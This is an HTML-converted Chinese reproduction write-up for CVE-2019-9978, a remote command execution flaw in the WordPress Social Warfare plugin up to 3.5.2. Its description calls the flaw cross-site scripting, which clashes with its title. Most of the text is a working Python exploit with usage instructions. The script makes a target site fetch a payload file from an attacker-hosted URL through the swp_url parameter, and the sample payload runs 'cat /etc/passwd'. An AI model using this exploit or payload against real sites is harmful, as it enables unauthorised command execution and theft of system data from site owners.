<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2019-9978）WordPress Plugin - social warfare 远程命令执行漏洞</h1><h2>一、漏洞简介</h2><p>WordPress social-warfare插件3.5.3之前版本中存在跨站脚本漏洞。远程攻击者可借助‘swp_url’参数利用该漏洞注入恶意的JavaScript脚本。</p><h2>二、漏洞影响</h2><p>Social WarFare Plugin (&lt;=3.5.2)</p><h2>三、复现过程</h2><h3>poc</h3><p>首先在自己的服务器上传http(s)://www.0-sec.org/payload.txt</p><p>&lt;pre&gt;system('cat /etc/passwd')&lt;/pre&gt;</p><p>useage</p><p> python cve-2019-9978.py --target http://vulntarget.com \<br />                         --payload-uri http://yourpayloadsite.com/payload.txt</p><p># Title: RCE in Social Warfare Plugin ( &lt;=3.5.2 )<br /># Date: March, 2019<br /># Researcher: Luka Sikic<br /># Exploit Author: hash3liZer<br /># Download Link: https://wordpress.org/plugins/social-warfare/<br /># Version: &lt;= 3.5.2<br /># CVE: CVE-2019-9978<br /><br />import sys<br />import requests<br />import re<br />import urlparse<br />import optparse<br /><br />class EXPLOIT:<br /><br />    VULNPATH = "wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=%s"<br /><br />    def __init__(self, _t, _p):<br />        self.target  = _t<br />        self.payload = _p<br /><br />    def engage(self):<br />        uri = urlparse.urljoin( self.target, self.VULNPATH % self.payload )<br />        r = requests.get( uri )<br />        if r.status_code == 500:<br />            print "[*] Received Response From Server!"<br />            rr  = r.text<br />            obj = re.search(r"^(.*)&lt;\!DOCTYPE", r.text.replace( "\n", "lnbreak" ))<br />            if obj:<br />                resp = obj.groups()[0]<br />                if resp:<br />                    print "[&lt;] Received: "<br />                    print resp.replace( "lnbreak", "\n" )<br />                else:<br />                    sys.exit("[&lt;] Nothing Received for the given payload. Seems like the server is not vulnerable!")<br />            else:<br />                sys.exit("[&lt;] Nothing Received for the given payload. Seems like the server is not vulnerable!")<br />        else:<br />            sys.exit( "[~] Unexpected Status Received!" )<br /><br />def main():<br />    parser = optparse.OptionParser(  )<br /><br />    parser.add_option( '-t', '--target', dest=&quot;target&quot;, default=&quot;&quot;, type=&quot;string&quot;, help=&quot;Target Link&quot; )<br />    parser.add_option( ''  , '--payload-uri', dest=&quot;payload&quot;, default=&quot;&quot;, type=&quot;string&quot;, help=&quot;URI where the file payload.txt is located.&quot; )<br /><br />    (options, args) = parser.parse_args()<br /><br />    print "[&gt;] Sending Payload to System!"<br />    exploit = EXPLOIT( options.target, options.payload )<br />    exploit.engage()<br /><br />if __name__ == "__main__":<br />    main()</p></body></html>